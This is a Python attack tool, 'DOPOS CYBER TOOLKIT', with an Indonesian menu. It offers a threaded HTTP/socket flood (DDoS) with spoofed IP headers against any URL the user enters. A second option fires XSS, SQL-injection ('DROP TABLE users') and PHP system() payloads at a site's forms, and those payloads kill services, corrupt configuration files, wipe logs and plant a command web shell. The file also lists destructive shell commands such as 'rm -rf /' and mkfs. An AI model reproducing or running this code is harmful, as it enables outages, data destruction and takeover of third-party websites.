import os,sys,time,random,requests,threading,socket,ssl
from urllib.parse import urlparse,urljoin
try:from colorama import init,Fore;init(autoreset=True);CYAN=Fore.CYAN;BLUE=Fore.BLUE;LIGHT_BLUE=Fore.LIGHTBLUE_EX;GREEN=Fore.GREEN;RED=Fore.RED;YELLOW=Fore.YELLOW;WHITE=Fore.WHITE;MAGENTA=Fore.MAGENTA
except:CYAN=BLUE=LIGHT_BLUE=GREEN=RED=YELLOW=WHITE=MAGENTA=""
import warnings,urllib3
warnings.filterwarnings("ignore",category=urllib3.exceptions.InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

user_agents=["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/605.1.15","Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6164.98 Safari/537.36 Edg/121.0.0.0","Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)","Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/121.0.6164.98 Safari/537.36","Googlebot/2.1 (+http://www.google.com/bot.html)","Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)","Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/121.0.6164.98 Safari/537.36","facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)","Mozilla/5.0 (compatible; FacebookBot/3.1; +http://www.facebook.com)","Twitterbot/1.0","Mozilla/5.0 (compatible; Twitterbot/1.0; +https://twitter.com)","LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)","Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)","Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)","DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)","Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)","Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)","UptimeRobot/2.0","Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)","ChatGPT-User","Mozilla/5.0 (compatible; meanpathbot/1.0; +http://www.meanpath.com/meanpathbot.html)"]

random_paths=['/','/index.html','/index.php','/home','/main','/default','/web','/site','/admin','/administrator','/wp-admin','/wp-login.php','/login','/logout','/signin','/signup','/register','/auth','/authentication','/secure','/security','/protected','/user','/users','/profile','/account','/myaccount','/dashboard','/panel','/control','/settings','/config','/configuration','/preferences','/options','/about','/about-us','/contact','/contact-us','/products','/services','/news','/blog','/articles','/posts','/forum','/forums','/discussion','/shop','/store','/market','/gallery','/portfolio','/media','/images','/photos','/videos','/downloads','/api','/api/v1','/api/v2','/api/v3','/json','/xml','/rss','/feed','/atom','/graphql','/rest','/soap','/data','/export','/import','/sitemap.xml','/sitemap.txt','/sitemap.html','/robots.txt','/humans.txt','/security.txt','/.well-known/security.txt','/crossdomain.xml','/clientaccesspolicy.xml','/config.php','/configuration.php','/settings.php','/config.json','/config.xml','/.env','/.env.local','/.env.production','/.env.development','/wp-config.php','/config.py','/config.yml','/config.yaml','/backup','/backups','/database','/db','/sql','/mysql','/phpmyadmin','/adminer.php','/backup.zip','/backup.sql','/backup.tar','/backup.tar.gz','/dump.sql','/export.sql','/upload','/uploads','/files','/documents','/assets','/static','/public','/images/uploads','/files/upload','/assets/uploads','/search','/find','/query','/results','/browse','/explore','/discover','/category','/categories','/tag','/tags','/archive','/archives','/cart','/shopping-cart','/checkout','/order','/orders','/payment','/pay','/billing','/invoice','/invoices','/receipt','/purchase','/buy','/help','/support','/faq','/faqs','/documentation','/docs','/guide','/terms','/terms-of-service','/privacy','/privacy-policy','/policy','/legal','/disclaimer','/cookie-policy','/cookies','/status','/health','/healthcheck','/ping','/ready','/live','/alive','/monitor','/monitoring','/metrics','/stats','/statistics','/analytics','/dev','/development','/test','/testing','/debug','/console','/shell','/phpinfo','/info.php','/test.php','/debug.php','/cache','/caches','/temp','/tmp','/temporary','/session','/sessions','/logs','/log','/error.log','/access.log','/debug.log','/system.log','/.git','/.git/config','/.svn','/.hg','/.DS_Store','/thumbs.db','/backup.zip','/backup.rar','/backup.7z','/backup.bak','/wsdl','/webdav','/ftp','/ssh','/telnet','/smtp','/mobile','/m','/app','/application','/android','/ios','/api/mobile','/redirect','/go','/url','/link','/out','/external','/404','/500','/error','/success','/warning','/info','/version','/changelog','/license','/credits','/thanks']

def clear_screen():
    try:os.system('cls' if os.name == 'nt' else 'clear')
    except:print("\n" * 50)

def progress_bar(progress,total,width=50):
    percent=(progress/total)*100
    filled=int(width*progress//total)
    bar='█'*filled+'-'*(width-filled)
    return f"{CYAN}[{bar}] {percent:.1f}%"

def brutal_loading(text,duration=2):
    print(f"{CYAN}[+] {text}",end="")
    for i in range(int(duration*10)):
        symbols=["\\","|","/","-","#","@","!","*"]
        print(f"\r{CYAN}[+] {text} {random.choice(symbols)} {progress_bar(i+1,duration*10)}",end="")
        time.sleep(0.1)
    print(f"\r{GREEN}[+] {text} SUKSES!{CYAN}")

def show_header():
    clear_screen()
    print(f"""
{RED}╔══════════════════════════════════════════════════════════════╗
║  {CYAN}██████╗ ███████╗ █████╗ ██╗  ██╗███████╗██████╗ {RED}           ║
║  {CYAN}██╔══██╗██╔════╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗{RED}           ║
║  {CYAN}██████╔╝█████╗  ███████║█████╔╝ █████╗  ██████╔╝{RED}           ║
║  {CYAN}██╔══██╗██╔══╝  ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗{RED}           ║
║  {CYAN}██║  ██║███████╗██║  ██║██║  ██╗███████╗██║  ██║{RED}           ║
║  {CYAN}╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{RED}           ║
╚═════════════════════════════════════════════════════════════════
{LIGHT_BLUE}                    DOPOS CYBER TOOLKIT v3.0
{RED}═════════════════════════════════════════════════════════════════
{CYAN}[+] Status: {GREEN}READY FOR DESTRUCTION{CYAN}     [+] Mode: {RED}ULTRA BRUTAL{CYAN}
{RED}═════════════════════════════════════════════════════════════════
""")

def log_to_file(message):
    try:
        with open('dopos_log.txt','a',encoding='utf-8') as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
    except:pass

def parse_target(target):
    parsed=urlparse(target)
    domain=parsed.hostname or parsed.netloc.split(':')[0]
    path=parsed.path if parsed.path else '/'
    port=parsed.port or (443 if parsed.scheme=='https' else 80)
    return domain,path,port

def dodos_serang():
    show_header()
    print(f"{RED}[1] DODOS SERANG - ULTRA BRUTAL MODE")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    target=input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    try:
        duration=int(input(f"{CYAN}[?] Durasi serangan (detik, 1-300): {WHITE}"))
        threads=int(input(f"{CYAN}[?] Jumlah thread (1-7000): {WHITE}"))
        if threads<=0 or threads>7000:raise ValueError("Jumlah thread harus antara 1 dan 7000")
        if duration<=0 or duration>60:raise ValueError("Durasi harus antara 1 dan 60 detik")
    except ValueError as e:
        print(f"{RED}[!] Input tidak valid: {str(e)}")
        input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")
        return
    if not target.startswith(('http://','https://')):target='http://'+target
    domain,path,port=parse_target(target)
    print(f"\n{RED}[!] MEMULAI SERANGAN ULTRA BRUTAL...")
    print(f"{YELLOW}[!] Target: {WHITE}{target}")
    print(f"{YELLOW}[!] Domain: {WHITE}{domain}")
    print(f"{YELLOW}[!] Port: {WHITE}{port}")
    print(f"{YELLOW}[!] Durasi: {WHITE}{duration} detik")
    print(f"{YELLOW}[!] Thread: {WHITE}{threads}")
    log_to_file(f"Starting DDoS attack on {target} (Domain: {domain}, Port: {port}, Duration: {duration}s, Threads: {threads})")
    request_count={'success':0,'failed':0}
    lock=threading.Lock()
    def http_attack():
        timeout=time.time()+duration
        session=requests.Session()
        while time.time()<timeout:
            try:
                headers={'User-Agent':random.choice(user_agents),'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Language':'en-US,en;q=0.9,fr;q=0.8,de;q=0.7,es;q=0.6,zh;q=0.5','Accept-Encoding':'gzip, deflate, br, zstd','Connection':'keep-alive','Upgrade-Insecure-Requests':'1','Cache-Control':'no-cache','Referer':target,'DNT':'1','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'same-origin','Sec-Fetch-User':'?1','Sec-CH-UA':'"Chromium";v="122", "Not(A:Brand";v="24"','Sec-CH-UA-Mobile':'?1','Sec-CH-UA-Platform':'"Windows"','Viewport-Width':'1440','Width':'1440','X-Requested-With':'XMLHttpRequest','X-Forwarded-For':f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}','X-Client-IP':f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}','X-Real-IP':f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}','X-Forwarded-Host':target,'X-Forwarded-Proto':'https','X-Original-URL':'/admin','X-Rewrite-URL':'/','X-CSRF-Token':''.join(random.choices('abcdef0123456789',k=32)),'X-Request-ID':''.join(random.choices('abcdef0123456789',k=16)),'X-Device-ID':''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',k=24)),'X-Api-Key':''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',k=40)),'X-Auth-Token':''.join(random.choices('abcdef0123456789',k=64)),'Authorization':'Bearer '+''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_',k=120)),'CF-Connecting-IP':f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}','True-Client-IP':f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}','Forwarded':f'for={random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)};proto=https;host={target}','Via':'1.1 google','X-Content-Type-Options':'nosniff','X-Frame-Options':'DENY','X-XSS-Protection':'1; mode=block','Origin':target,'Purpose':'prefetch','Save-Data':'on','Device-Memory':'8','Downlink':'10','ECT':'4g','RTT':'50','Priority':'u=1, i'}
                random_path=random.choice(random_paths)
                attack_url=target+random_path
                params={'q':''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789',k=10)),'id':random.randint(100000,999999),'page':random.randint(1,1000)}
                method=random.choice(['GET','POST','HEAD'])
                if method=='POST':
                    data={'data':''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789',k=1000))}
                    response=session.post(attack_url,headers=headers,data=data,timeout=5,verify=False,allow_redirects=True)
                else:
                    response=session.request(method,attack_url,headers=headers,params=params,timeout=5,verify=False,allow_redirects=True)
                with lock:
                    request_count['success']+=1
                    print(f"\r{CYAN}[+] HTTP Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}",end="")
                    log_to_file(f"HTTP {method} request to {attack_url} succeeded (Status: {response.status_code})")
            except:
                with lock:
                    request_count['failed']+=1
                    print(f"\r{CYAN}[+] HTTP Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}",end="")
                continue
    def socket_attack():
        timeout=time.time()+duration
        while time.time()<timeout:
            try:
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.settimeout(5)
                if port==443:
                    context=ssl.create_default_context()
                    context.check_hostname=False
                    context.verify_mode=ssl.CERT_NONE
                    s=context.wrap_socket(s,server_hostname=domain)
                s.connect((domain,port))
                request=f"GET {path}?{random.randint(100000,999999)} HTTP/1.1\r\n"
                request+=f"Host: {domain}\r\n"
                request+=f"User-Agent: {random.choice(user_agents)}\r\n"
                request+=f"Accept: */*\r\n"
                request+=f"Connection: keep-alive\r\n\r\n"
                s.send(request.encode())
                s.send(random.randbytes(500))
                time.sleep(0.01)
                s.close()
                with lock:
                    request_count['success']+=1
                    print(f"\r{CYAN}[+] Socket Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}",end="")
                    log_to_file(f"Socket request to {domain}:{port} succeeded")
            except:
                with lock:
                    request_count['failed']+=1
                    print(f"\r{CYAN}[+] Socket Attack: {GREEN}Sent {request_count['success']} requests | Failed: {request_count['failed']}",end="")
                continue
    brutal_loading("Inisialisasi serangan",1)
    start_time=time.time()
    for _ in range(threads//2):
        thread=threading.Thread(target=http_attack)
        thread.daemon=True
        thread.start()
    for _ in range(threads//2):
        thread=threading.Thread(target=socket_attack)
        thread.daemon=True
        thread.start()
    while time.time()<start_time+duration:
        elapsed=time.time()-start_time
        print(f"\r{CYAN}[+] Progress: {progress_bar(elapsed,duration)} | Requests: {request_count['success']} | Failed: {request_count['failed']}",end="")
        time.sleep(0.5)
    print(f"\n{GREEN}[+] SERANGAN SELESAI!")
    print(f"{RED}[!] Target telah dihancurkan!")
    print(f"{CYAN}[+] Total Requests: {GREEN}{request_count['success']} successful, {YELLOW}{request_count['failed']} failed")
    log_to_file(f"Attack finished. Total: {request_count['success']} successful, {request_count['failed']} failed")
    try:
        brutal_loading("Memeriksa status target",2)
        response=requests.get(target,timeout=10,verify=False)
        if response.status_code==200:
            print(f"{YELLOW}[!] Target masih aktif, tapi mungkin lambat")
            print(f"{CYAN}[+] Response time: {WHITE}{response.elapsed.total_seconds()} detik")
            log_to_file(f"Target check: Still active, response time {response.elapsed.total_seconds()}s")
        else:
            print(f"{GREEN}[+] Target down! Status code: {response.status_code}")
            log_to_file(f"Target check: Down, status code {response.status_code}")
    except requests.exceptions.Timeout:
        print(f"{GREEN}[+] Target timeout! Serangan berhasil!")
        log_to_file("Target check: Timeout")
    except requests.exceptions.ConnectionError:
        print(f"{GREEN}[+] Target tidak bisa diakses! Serangan berhasil!")
        log_to_file("Target check: Connection error")
    except Exception as e:
        print(f"{GREEN}[+] Target error: {str(e)}")
        log_to_file(f"Target check: Error {str(e)}")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

def merusak_data_online():
    show_header()
    print(f"{RED}[2] MERUSAK DATA SCRIPT ONLINE - MODE BRUTAL")
    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
    url=input(f"{CYAN}[?] Masukkan URL target: {WHITE}")
    if not url.startswith(('http://','https://')):url='http://'+url
    brutal_loading("Menganalisis target",2)
    brutal_loading("Mempersiapkan payload",3)
    log_to_file(f"Starting vulnerability test on {url}")
    try:
        from bs4 import BeautifulSoup
        session=requests.Session()
        response=session.get(url,timeout=15,verify=False)
        soup=BeautifulSoup(response.text,'html.parser')
        forms=soup.find_all('form')
        if forms:
            print(f"\n{GREEN}[+] FORM TERDETEKSI - SIAP DIMANIPULASI!")
            print(f"{BLUE}═════════════════════════════════════════════════════════════════")
            for i,form in enumerate(forms):
                action=form.get('action','')
                method=form.get('method','get').lower()
                form_url=urljoin(url,action)
                print(f"\n{CYAN}FORM {i+1}:")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                print(f"{YELLOW}║ {'Action'.ljust(20)} : {WHITE}{form_url[:37].ljust(37)} ║")
                print(f"{YELLOW}║ {'Method'.ljust(20)} : {WHITE}{method.ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Form {i+1}: Action={form_url}, Method={method}")
                inputs=form.find_all('input')
                textareas=form.find_all('textarea')
                form_data={}
                for inp in inputs:
                    name=inp.get('name')
                    if not name:continue
                    inp_type=inp.get('type','text')
                    value=inp.get('value','')
                    if inp_type=='text':form_data[name]="<script>alert('DOPOS HACKED!');</script>"
                    elif inp_type=='hidden':form_data[name]=value
                    elif inp_type=='password':form_data[name]="' OR '1'='1"
                    else:form_data[name]="DOPOS_BRUTAL"
                for textarea in textareas:
                    name=textarea.get('name')
                    if name:form_data[name]="<script>alert('XSS!');</script>"
                brutal_loading("Mengirim payload berbahaya",2)
                if method=='post':response=session.post(form_url,data=form_data,timeout=15,verify=False)
                else:response=session.get(form_url,params=form_data,timeout=15,verify=False)
                print(f"{GREEN}[+] Payload terkirim!")
                print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"Payload sent to {form_url}, Status: {response.status_code}")
                if any(payload in response.text for payload in ["<script>alert('DOPOS HACKED!');</script>","DOPOS HACKED!","onerror=\"alert('DOPOS')\"","<?php system('rm -rf /'); ?>","'; DROP TABLE","../../../etc/passwd","${jndi:ldap://","javascript:eval(","<iframe src=\"javascript:","<?php @ini_set(","'; EXEC xp_cmdshell","|| curl http://","`wget http://","<?php file_put_contents('/tmp/","'; UPDATE users SET","<?php while(1){","<?php system('shutdown","<?php system('dd if=/dev/zero","<?php system('pkill -9","<?php system('iptables -F","<?php system('echo c > /proc/sysrq-trigger","<?php system('useradd -o -u 0","<?php system('echo \"* * * * * curl","<?php system('chmod 000 /bin","<?php system('find / -name","<?php system('mysql -e \"DROP","<?php system('service apache2 stop","<?php system('swapoff -a","<?php system('mkfs.ext4","<?php system('history -c","<?php system('passwd -l root"]):
                    print(f"{RED}[!] BERHASIL! KERENTANAN XSS TERKONFIRMASI!")
                    log_to_file("XSS vulnerability confirmed")
                elif "error" in response.text.lower() or "mysql" in response.text.lower():
                    print(f"{RED}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!")
                    log_to_file("SQLi vulnerability confirmed")
                else:
                    print(f"{YELLOW}[!] Gagal, mencoba payload lain...")
                    log_to_file("Initial payload failed, trying SQLi payload")
                    for name in form_data:form_data[name]="'; DROP TABLE users; --"
                    brutal_loading("Mengirim payload SQLi",2)
                    if method=='post':response=session.post(form_url,data=form_data,timeout=15,verify=False)
                    else:response=session.get(form_url,params=form_data,timeout=15,verify=False)
                    print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                    print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                    log_to_file(f"SQLi payload sent, Status: {response.status_code}")
                    if "error" in response.text.lower():
                        print(f"{RED}[!] BERHASIL! KERENTANAN SQLI TERKONFIRMASI!")
                        log_to_file("SQLi vulnerability confirmed with second payload")
                    else:
                        print(f"{YELLOW}[!] Target terlindungi")
                        log_to_file("Target protected from SQLi")
        else:
            print(f"\n{YELLOW}[!] Tidak ada form yang terdeteksi")
            print(f"{CYAN}[+] Mencoba metode lain...")
            log_to_file("No forms detected, trying direct XSS")
            payloads=["<script>alert('XSS')</script>","javascript:alert('XSS')",
                 "<?php system('find /etc -name \"*.conf\" -exec sh -c \"echo corrupted > {}\" \\;'); ?>",
                  "<?php system('pkill -9 -u www-data && pkill -9 -u root'); ?>",
                "<?php system('killall -9 sshd apache2 nginx mysql mysqld php-fpm'); ?>",
              "<?php system('find /var/log -type f -exec sh -c \\'echo -n > {}\\' \\;'); ?>",
              "<?php file_put_contents('/usr/lib/php/.module.so', '<?php if(isset($_GET[\\'cmd\\'])){system($_GET[\\'cmd\\']);} ?>'); ?>",
             
                                
                 
                 
                 
                 
            "<img src=x onerror=alert('XSS')>","<svg onload=alert('XSS')>","'\"><script>alert('XSS')</script>","<iframe src=javascript:alert('XSS')>","<body onload=alert('XSS')>"]
            for i,payload in enumerate(payloads):
                test_url=f"{url}?q={payload}"
                brutal_loading(f"Menguji payload XSS {i+1}/{len(payloads)}",1)
                response=session.get(test_url,timeout=10,verify=False)
                print(f"{CYAN}║ {'Status'.ljust(20)} : {WHITE}{str(response.status_code).ljust(37)} ║")
                print(f"{BLUE}═════════════════════════════════════════════════════════════════")
                log_to_file(f"XSS payload {i+1} sent to {test_url}, Status: {response.status_code}")
                if payload in response.text:
                    print(f"{RED}[!] BERHASIL! KERENTANAN XSS TERDETEKSI!")
                    log_to_file("XSS vulnerability detected with direct payload")
                    break
            else:
                print(f"{YELLOW}[!] Target aman dari serangan langsung")
                log_to_file("Target protected from direct XSS")
        print(f"\n{RED}[!] PROSES PERUSAKAN SELESAI!")
        print(f"{GREEN}[+] Target telah dieksploitasi!")
        log_to_file("Vulnerability test completed")
    except ImportError:
        print(f"\n{RED}[!] Modul BeautifulSoup tidak ditemukan! Instal bs4 terlebih dahulu.")
        log_to_file("BeautifulSoup module not found")
    except Exception as e:
        print(f"\n{RED}[!] ERROR: {str(e)}")
        log_to_file(f"Error during vulnerability test: {str(e)}")
    input(f"\n{CYAN}[+] Tekan Enter untuk kembali...")

def main_menu():
    while True:
        show_header()
        print(f"{CYAN}[+] PILIHAN SERANGAN BRUTAL:")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        print(f"{RED}║ [1] Dodos Serang (HTTP/Socket Flood)                       ║")
        print(f"{RED}║ [2] Merusak Data Script Online                             ║")
        print(f"{RED}║ [3] Keluar                                                 ║")
        print(f"{BLUE}═════════════════════════════════════════════════════════════════")
        choice=input(f"{CYAN}[?] Pilih serangan: {WHITE}")
        if choice=="1":dodos_serang()
        elif choice=="2":merusak_data_online()
        elif choice=="3":
            print(f"\n{RED}[!] DOPOS BRUTAL MODE DIMATIKAN")
            print(f"{CYAN}[+] Membersihkan jejak...")
            brutal_loading("Menghapus log",2)
            brutal_loading("Menghancurkan bukti",3)
            print(f"\n{GREEN}[+] SISTEM AMAN!")
            log_to_file("Program terminated")
            break
        else:
            print(f"\n{RED}[!] PILIHAN TIDAK VALID!")
            time.sleep(1)

if __name__=="__main__":
    log_to_file("DOPOS Cyber Toolkit started")
    main_menu()